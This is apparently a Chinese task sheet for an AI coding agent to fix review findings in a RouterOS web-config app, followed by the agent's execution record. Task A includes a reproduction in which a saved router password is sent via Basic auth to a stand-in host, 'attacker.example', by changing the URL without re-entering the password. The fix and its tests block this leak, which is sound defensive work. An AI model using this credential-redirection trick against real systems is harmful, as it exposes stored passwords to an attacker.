# Codex 任务单：0.6.30 审查修复

> 基线：`main` @ ba1cfb5（0.6.30 五项任务 + 执行记录，未推送）。199 个测试全绿，前端构建通过。
> 来源：2026-11-19 对 0.6.30 的审查。版本号仍是 0.6.30，不改。
> 约定同 `codex-0.6.30-ros-web-config.md`：每个任务一个本地 commit，中文消息，不 push、不打 tag；每个任务后跑全量 pytest 和 `npm run build`。

---

## 任务 A（必须修）已保存的 RouterOS 密码会发给新填的地址

**问题**（已用测试复现）

密码设计成“只写不读”，但现在有两条路能把已保存的密码原文发到任意主机：

1. `POST /api/ros/test` 带 `url` 但不带 `password` 时，用 `cfg["ros_password"]`（已保存的密码）去连这个新地址。`backend/app/routers/admin.py` 的 `ros_test()`：`req.password or cfg["ros_password"]`。
2. `PUT /api/settings` 只改 `ros_url` 不带 `ros_password` 时，数据库里的旧密码保留，`poller.configure()` 后下一次轮询就带着旧密码的 Basic 认证去请求新地址。

在新地址上开一个 HTTP 服务，就能从 `Authorization` 头里拿到密码原文。

复现（两条都通过，说明能泄露）：

```python
api.put("/api/settings", json={"ros_url": "https://192.168.88.1", "ros_user": "rosdpi", "ros_password": "S3cret!"})
api.post("/api/ros/test", json={"url": "http://attacker.example"})
# → MockTransport 收到 attacker.example 的请求，Basic 认证是 rosdpi:S3cret!

api.put("/api/settings", json={"ros_url": "http://attacker.example"})
poller.poll()
# → 同上
```

**改法**

1. `backend/app/routers/admin.py` 新增 `_same_origin(a: str, b: str) -> bool`：比较 `urlsplit` 后的 `(scheme, hostname 小写, 端口)`，没写端口时按 http=80、https=443 补齐。
2. `ros_test()`：只有 `_same_origin(url, 当前生效的 ros_url)` 时，才允许用已保存的密码。地址不同且请求里没给密码时，返回 `{"ok": False, "error": "地址改了，请重新输入密码再测试"}`，**不发任何请求**。
3. `put_settings()`：本次改了 `ros_url`（非空），新地址和数据库或环境变量里生效的旧地址不同源，并且请求里没带 `ros_password` 时，返回 400：“地址改了，请重新输入密码”。不保存，也不调用 `configure`。
   - 同源时（比如只是去掉末尾 `/`、加上 `/rest`）照常保留旧密码。
   - `ros_url=""`（停用）不受影响，现有逻辑本来就会把密码清空。
   - “首次只改账号或 TLS 时记录环境变量地址”的分支不会改变地址，不受影响。
4. 前端 `frontend/src/components/RouterOsCard.vue`：`form.url` 和 `props.config.url` 不同源时：
   - 密码框的 placeholder 不再显示“已保存，留空则不修改”，改成新文案“地址已修改，需要重新输入密码”（新 i18n 键 `settings.rosPasswordRequired`，中英文成对）；
   - 密码框为空时，「测试连接」和「保存」按钮禁用。
   - 前端同源判断用 `new URL()`，解析失败按不同源处理。
5. 测试（加进 `backend/tests/test_v0630_ros_web_config.py`）：
   - 上面两条复现写成测试，改完后断言：新主机**收不到任何请求**，接口分别返回 `ok: False` 和 400。
   - 同源换写法（`https://192.168.88.1/` → `https://192.168.88.1/rest`）不带密码可以保存，并且仍用旧密码。
   - 不同源但带了新密码：可以测试、可以保存，用的是新密码。

## 任务 B（建议）刚保存或刚启动时概览页误报“连接失败”

**问题**：`configure()` 后 `ok=False`、`error=""`、`last_poll=0`。在第一次轮询回来之前，`Overview.vue` 的 `d.router.enabled && !d.router.ok` 分支会显示红色的“RouterOS API 连接失败”，但其实还没连。服务刚启动时也一样。

**改法**：`enabled && !ok && !last_poll` 时显示灰色的“正在连接 RouterOS…”（新 i18n 键 `overview.rosConnecting`，中英文成对），不显示错误样式；`RouterOsCard.vue` 的状态点也同样处理，用灰色。

## 任务 C（建议）勾选“校验证书”后证书不通过，提示却说连不上

**问题**：`ros_poller._explain()` 把所有 `httpx.ConnectError` 都翻译成“连不上 RouterOS：检查地址，并确认 www-ssl 已启用”。httpx 在证书校验失败时抛的也是 `ConnectError`，用户勾了“校验 HTTPS 证书”而路由器用的是自签证书时，看到的提示是错的。

**改法**：在 `ConnectError` 分支里先判断证书校验失败（沿 `e.__cause__` / `e.__context__` 找 `ssl.SSLCertVerificationError`，或者 `str(e)` 里含 `CERTIFICATE_VERIFY_FAILED`）。是证书问题时返回“RouterOS 的 HTTPS 证书校验失败：路由器用自签证书时，请取消勾选「校验 HTTPS 证书」”。错误原文仍然不拼进提示。加一个测试。

---

## 不在本单（记录一下）

- 外部数据源（sing-box secret、AdGuard 密码）也有任务 A 的问题：只改地址时会沿用已保存的密钥。这是 0.6.30 之前就有的，等用户决定是否一起修。

## 完成后

在本文件末尾追加执行记录：commit 号、新增测试数、全量 pytest 和 `npm run build` 结果、偏离本单的地方和理由。不要 push。

## 执行记录

2026-11-19，从本地提交 `f42a969` 开始执行，版本号保留 0.6.30。新增测试数按 pytest 收集的参数化用例计数。

| 任务 | 本地提交 | 新增测试 | 后端全量 pytest | 前端构建与中英文键检查 |
|---|---|---:|---|---|
| A · 更换地址时保护已保存的密码 | `be72714` | 5 | 204 passed | 通过，1,242 个键 |
| B · 首次轮询等待状态 | `1a871e3` | 0 | 204 passed | 通过，1,243 个键 |
| C · HTTPS 证书校验提示 | `9593e03` | 2 | 206 passed | 通过，1,243 个键 |

- **A**　覆盖网页和环境变量配置。改变协议、主机或端口且未提供非空密码时，试连和保存均在创建客户端前返回，数据库及运行配置保持原值。测试也覆盖同源地址保留密码，以及显式输入新密码后试连和保存成功。原有两项试连测试改在同源地址验证留空复用密码，以适配本次修复。Edge 中验证了两个按钮随地址和密码输入切换可用状态。
- **B**　用两组状态响应在 Edge 中验证，首次轮询等待时概览文案与两处状态点均为灰色，已完成轮询并失败时概览显示红色和错误摘要。
- **C**　两项用例分别覆盖异常链和错误标识。另对使用临时自签证书的本地 HTTPS 服务做了实际握手，开启校验时收到指定提示，取消勾选后试连成功。

三轮测试各有 3 条既有警告，涉及 Starlette 测试客户端、AnyIO 和 JWT 兼容测试。`git diff --check` 与控制字符扫描均通过。三项修复各自提交，执行记录单独提交，以便引用 C 的实际提交号。未推送、未打标签。
